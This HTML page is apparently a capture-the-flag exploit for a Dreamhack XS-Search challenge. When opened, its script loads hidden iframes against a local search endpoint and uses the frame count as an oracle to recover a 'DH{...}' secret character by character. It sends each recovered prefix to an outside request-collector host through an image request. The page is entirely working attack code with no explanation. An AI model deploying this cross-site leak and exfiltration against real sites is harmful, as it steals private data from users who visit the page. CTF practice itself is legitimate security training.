<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
</head>
<body>
    <h1>XS-Search Site</h1>

        <script>
            async function search(query) {
                return new Promise((resolve) => {
                    const ifr = document.createElement('iframe');
                    ifr.src = `http://127.0.0.1:8000/search?query=${encodeURIComponent(query)}`;
                    ifr.style.display = 'none';
                    document.body.appendChild(ifr);

                    ifr.onload = () => {
                        const isFound = ifr.contentWindow.length > 0;
                        document.body.removeChild(ifr);
                        resolve(isFound);
                    }
                })
            }

            async function exploit() {
                let chars = "abcdefghijklmnopqrstuvwxyz0123456789}"
                let secret_length = 40;
                let secret = "DH{";

                for (let i = 0; i < secret_length; i++) {
                    let found = false;

                    for (let c of chars) {
                        if (await search(secret + c)) {
                            secret += c;
                            new Image().src = `https://wrisagx.request.dreamhack.games?secret=${secret}`;
                            console.log(`found: ${secret}`);
                            found = true;

                            if (c === '}') return;
                            break;
                        }
                    }

                    if (!found) {
                        console.error(`Character not found for position ${i}`);
                        break;
                    }
                }
            }

            exploit();
    </script>
</body>
</html>
